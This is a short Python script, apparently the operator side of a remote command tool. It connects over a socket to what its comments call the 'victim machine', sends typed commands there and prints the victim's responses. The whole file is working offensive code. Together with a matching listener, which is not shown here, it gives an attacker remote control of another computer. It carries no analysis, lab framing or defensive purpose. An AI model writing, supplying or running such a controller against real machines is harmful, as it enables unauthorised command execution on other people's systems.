from socket import socket


# Define the address and port of the server (always of the victim machine)
server_address = ('0.0.0.0', 5000)

# We create the client socket, as we re-establish the connection to each command that is executed
client_socket = socket()
client_socket.connect(server_address)
state = True

while state:

    # We ask the user to enter a command
    send_command = input("Enter the command you want to send to the victim machine (or 'exit' to exit): ")
    

    # If the user enters "exit", we close the connection and exit the loop.
    if send_command == 'exit':
        # We tell the server that the connection is closed:
        client_socket.send(send_command.encode())
        # We close the socket, which will be reopened at the beginning of the loop:
        client_socket.close()
        state = False
    else:
        # We send the command to the victim machine:
        client_socket.send(send_command.encode())

        # We wait for the victim's response and store it in the response variable.
        response = client_socket.recv(4096)

        # We print out the answer;
        print(response.decode()) 